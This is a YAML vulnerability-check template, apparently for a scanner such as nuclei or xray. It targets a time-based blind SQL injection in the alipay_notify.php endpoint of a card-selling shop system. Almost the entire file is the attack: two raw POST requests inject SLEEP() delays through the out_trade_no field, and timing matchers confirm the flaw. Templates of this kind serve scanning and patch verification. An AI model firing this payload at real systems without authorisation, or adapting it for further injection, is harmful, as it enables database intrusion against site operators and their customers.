id: poc-yaml-internet-fk-alipay-notify-sqli
info:
  name: 发卡宝卡密寄售系统 alipay_notify.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(6,9)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3) + 2}}"
http:
  - raw:
      - |
        POST /shop/alipay_notify.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        out_trade_no=' AND (SELECT 4286 FROM (SELECT(SLEEP({{t1}})))ztQX)-- rLAn
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "fail"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
  - raw:
      - |
        POST /shop/alipay_notify.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        out_trade_no=' AND (SELECT 4286 FROM (SELECT(SLEEP({{t3}})))ztQX)-- rLAn
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "fail"
      - type: dsl
        dsl:
          - "duration >= to_number(t3)"
          - "duration <= to_number(t4)"
